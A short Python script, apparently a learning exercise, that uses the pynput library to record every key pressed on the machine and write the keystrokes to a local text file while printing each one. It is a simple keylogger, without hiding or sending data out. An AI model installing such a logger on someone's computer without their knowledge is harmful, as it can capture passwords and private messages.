from pynput import keyboard

list = []

def get_key_name(key):
    if isinstance(key,keyboard.KeyCode):
        return key.char
    else:
        return str(key)

def on_press(key):
    key_name = get_key_name(key)
    list.append(key_name)
    f = open('keyPressed.txt','w')
    for ele in list:
          f.write(ele)
    f.close()
    print("Key {} pressed".format(key_name))
    print("Key type: {}".format(key.__class__.__name__))

with keyboard.Listener(
    on_press = on_press) as listener:
    listener.join()

